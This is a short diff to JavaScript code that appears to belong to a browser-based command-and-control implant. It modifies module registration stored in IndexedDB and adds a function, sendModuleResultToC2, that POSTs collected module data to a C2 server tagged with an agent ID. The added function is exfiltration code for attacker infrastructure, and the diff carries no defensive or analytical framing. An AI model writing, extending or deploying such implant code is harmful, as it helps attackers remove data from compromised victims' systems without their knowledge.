@@ -255,7 +255,7 @@ function SI(Meta){
   }, 500);
 }
 
-function registerModule(name, initFunction){
+function registerModule(name){
   new Promise((res, rej) => {
     ReadIDB("extra_modules", rej);
   }).catch(function(m){
@@ -264,7 +264,7 @@ function registerModule(name, initFunction){
     }else{
       m = JSON.parse(m);
     }
-    m[name] = initFunction;
+    m[name] = name;
     WriteIDB("extra_modules", JSON.stringify(m));
   });
 }
@@ -278,6 +278,13 @@ function deregisterModule(name){
       delete m[name];
       WriteIDB("extra_modules", JSON.stringify(m));
     }
+  });
+}
+
+function sendModuleResultToC2(name, data){
+  fetch(C2_SERVER + '/module/' + name + '/' + agentID, {
+    body: data,
+    method: 'POST'
   });
 }
 
